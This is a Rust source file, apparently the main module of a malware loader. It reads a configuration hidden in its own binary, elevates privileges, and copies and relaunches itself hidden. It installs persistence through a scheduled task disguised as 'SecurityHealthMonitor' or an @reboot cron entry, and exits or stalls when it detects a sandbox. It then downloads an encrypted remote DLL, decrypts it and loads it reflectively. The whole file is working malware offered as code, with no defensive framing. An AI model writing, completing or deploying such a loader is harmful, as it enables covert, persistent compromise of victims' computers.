mod config;
mod dll_fetch;
mod pe_loader;

use config::LoaderConfig;
use std::env;

fn main() {
    // 1. Parse injected config from binary
    let (injected, raw_json) = match parse_injected_config() {
        Some((cfg, json)) => (cfg, json),
        None => {
            eprintln!("[!] No injected config found");
            std::process::exit(1);
        }
    };

    let loader_cfg = LoaderConfig::from_injected(injected, raw_json);

    // 2. Apply persistence (may relaunch/copy and exit)
    apply_persistence(loader_cfg.require_admin, loader_cfg.copy_to_path.as_deref(), loader_cfg.enable_persistence);

    // 3. Anti-analysis check (inline, no libra-modules dependency)
    if is_sandbox() {
        eprintln!("[!] Sandbox detected. Exiting.");
        std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
        std::process::exit(0);
    }

    // 4. Decrypt AES key
    let aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[!] Failed to decrypt AES key: {}", e);
            std::process::exit(1);
        }
    };

    // 5. Download and decrypt core DLL
    let download_url = loader_cfg.download_url();
    eprintln!("[*] Downloading core from: {}", download_url);

    let rt = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(e) => {
            eprintln!("[!] Failed to create tokio runtime: {}", e);
            std::process::exit(1);
        }
    };

    let dll_bytes = match rt.block_on(dll_fetch::download_core(&download_url)) {
        Ok(encrypted) => {
            eprintln!("[*] Downloaded {} bytes, decrypting...", encrypted.len());
            match dll_fetch::decrypt_dll(&encrypted, &aes_key) {
                Ok(decrypted) => {
                    eprintln!("[*] Core DLL decrypted: {} bytes", decrypted.len());
                    decrypted
                }
                Err(e) => {
                    eprintln!("[!] Failed to decrypt core DLL: {}", e);
                    std::process::exit(1);
                }
            }
        }
        Err(e) => {
            eprintln!("[!] Failed to download core: {}", e);
            std::process::exit(1);
        }
    };

    // 6. Validate PE/ELF header
    if dll_bytes.len() < 2 {
        eprintln!("[!] Core DLL too small");
        std::process::exit(1);
    }

    #[cfg(target_os = "windows")]
    if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        eprintln!("[!] Core DLL is not a valid PE file");
        std::process::exit(1);
    }

    #[cfg(target_os = "linux")]
    if dll_bytes[0] != 0x7F || dll_bytes[1] != 0x45 {
        eprintln!("[!] Core DLL is not a valid ELF file");
        std::process::exit(1);
    }

    // 7. Reflective load
    eprintln!("[*] Reflective loading core DLL...");
    let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[!] Reflective load failed: {}", e);
            std::process::exit(1);
        }
    };

    // 8. Call core_main with config JSON
    eprintln!("[*] Calling core_main...");
    let config_bytes = loader_cfg.config_json.as_bytes();
    entry_fn(config_bytes.as_ptr(), config_bytes.len());

    // Should not return, but if it does:
    std::process::exit(0);
}

// ── Config Injection ──────────────────────────────────────────────────

use libra_common::models::{InjectedConfig, CONFIG_MAGIC};

fn parse_injected_config() -> Option<(InjectedConfig, String)> {
    let exe_path = env::current_exe().ok()?;
    let data = std::fs::read(&exe_path).ok()?;

    if data.len() < CONFIG_MAGIC.len() + 4 {
        return None;
    }

    let magic_pos = data
        .windows(CONFIG_MAGIC.len())
        .rposition(|w| w == CONFIG_MAGIC.as_slice())?;

    let pos = magic_pos + CONFIG_MAGIC.len();
    if pos + 4 > data.len() {
        return None;
    }

    let len_bytes: [u8; 4] = data[pos..pos + 4].try_into().ok()?;
    let json_len = u32::from_le_bytes(len_bytes) as usize;
    let json_start = pos + 4;

    if json_start + json_len > data.len() {
        return None;
    }

    let json_bytes = &data[json_start..json_start + json_len];
    let json_str = std::str::from_utf8(json_bytes).ok()?;
    let config: InjectedConfig = serde_json::from_str(json_str).ok()?;

    Some((config, json_str.to_string()))
}

// ── Persistence (lightweight, no libra-modules dependency) ────────────

fn apply_persistence(require_admin: bool, copy_to_path: Option<&str>, enable_persistence: bool) {
    if require_admin {
        ensure_admin();
    }

    if let Some(path) = copy_to_path {
        if !path.is_empty() {
            copy_and_relaunch(path);
        }
    }

    if enable_persistence {
        install_persistence();
    }
}

fn ensure_admin() {
    #[cfg(target_os = "windows")]
    {
        if is_windows_admin() {
            return;
        }
        let exe = match env::current_exe() {
            Ok(p) => p,
            Err(_) => std::process::exit(1),
        };
        let exe_wide: Vec<u16> = exe.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
        unsafe {
            ShellExecuteW(
                std::ptr::null_mut(),
                wide("runas").as_ptr(),
                exe_wide.as_ptr(),
                std::ptr::null(),
                std::ptr::null(),
                1,
            );
        }
        std::process::exit(0);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let uid = unsafe { libc::getuid() };
        if uid == 0 {
            return;
        }
        eprintln!("[!] Must run as root. Exiting.");
        std::process::exit(1);
    }
}

fn copy_and_relaunch(relative_path: &str) {
    let current_exe = match env::current_exe() {
        Ok(e) => e,
        Err(_) => return,
    };
    let current_dir = current_exe.parent().unwrap_or(std::path::Path::new("."));

    #[cfg(target_os = "windows")]
    let target_dir = {
        let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
        std::path::PathBuf::from(appdata).join(relative_path)
    };
    #[cfg(not(target_os = "windows"))]
    let target_dir = {
        let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
        std::path::PathBuf::from(home).join(".local/share").join(relative_path)
    };

    if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
        return;
    }

    let target_exe = target_dir.join(current_exe.file_name().unwrap_or_default());
    if std::fs::create_dir_all(&target_dir).is_err() {
        std::process::exit(0);
    }
    if std::fs::copy(&current_exe, &target_exe).is_err() {
        std::process::exit(0);
    }

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let _ = std::process::Command::new(&target_exe)
            .creation_flags(0x08000000)
            .spawn();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = std::process::Command::new(&target_exe).spawn();
    }

    std::process::exit(0);
}

fn install_persistence() {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let exe = match env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let _ = std::process::Command::new("schtasks.exe")
            .args(["/create", "/tn", "SecurityHealthMonitor", "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let exe = match env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
        let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
        let _ = std::process::Command::new("bash")
            .args(["-c", &cmd])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
}

// ── Anti-analysis (inline, no libra-modules dependency) ───────────────

fn is_sandbox() -> bool {
    check_cpu_cores() || check_memory() || check_uptime()
}

fn check_cpu_cores() -> bool {
    match std::thread::available_parallelism() {
        Ok(n) => n.get() < 2,
        Err(_) => false,
    }
}

fn check_memory() -> bool {
    use sysinfo::System;
    let sys = System::new_with_specifics(
        sysinfo::RefreshKind::nothing()
            .with_memory(sysinfo::MemoryRefreshKind::everything()),
    );
    let total_mb = sys.total_memory() / (1024 * 1024);
    total_mb < 2048
}

fn check_uptime() -> bool {
    let uptime = get_system_uptime_secs();
    uptime < 300
}

fn get_system_uptime_secs() -> u64 {
    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = std::fs::read_to_string("/proc/uptime") {
            if let Some(uptime_str) = content.split_whitespace().next() {
                if let Ok(uptime) = uptime_str.parse::<f64>() {
                    return uptime as u64;
                }
            }
        }
        3600
    }
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        if let Ok(output) = Command::new("wmic")
            .args(["os", "get", "lastbootuptime", "/format:csv"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            if let Some(line) = text.lines().nth(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let boot_time = parts[1].trim();
                    if let Ok(bt) = parse_wmi_datetime(boot_time) {
                        let now = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        return now.saturating_sub(bt);
                    }
                }
            }
        }
        3600
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        3600
    }
}

#[cfg(target_os = "windows")]
fn parse_wmi_datetime(s: &str) -> Result<u64, ()> {
    if s.len() < 14 {
        return Err(());
    }
    let year: i32 = s[0..4].parse().map_err(|_| ())?;
    let month: u32 = s[4..6].parse().map_err(|_| ())?;
    let day: u32 = s[6..8].parse().map_err(|_| ())?;
    let hour: u32 = s[8..10].parse().map_err(|_| ())?;
    let min: u32 = s[10..12].parse().map_err(|_| ())?;
    let sec: u32 = s[12..14].parse().map_err(|_| ())?;

    let days_before_month: [u32; 12] = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
    let is_leap = |y: i32| y % 4 == 0 && (y % 100 != 0 || y % 400 == 0);
    let days_since_epoch = (year as u64 - 1970) * 365
        + (year as u64 - 1969) / 4
        - (year as u64 - 1901) / 100
        + (year as u64 - 1601) / 400
        + days_before_month[(month - 1) as usize] as u64
        + if month > 2 && is_leap(year) { 1 } else { 0 }
        + (day - 1) as u64;
    Ok(days_since_epoch * 86400 + hour as u64 * 3600 + min as u64 * 60 + sec as u64)
}

#[cfg(target_os = "windows")]
fn is_windows_admin() -> bool {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("net")
        .args(["session"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

#[cfg(target_os = "windows")]
unsafe fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
extern "system" {
    fn ShellExecuteW(
        hwnd: *mut std::ffi::c_void,
        lpOperation: *const u16,
        lpFile: *const u16,
        lpParameters: *const u16,
        lpDirectory: *const u16,
        nShowCmd: i32,
    ) -> usize;
}
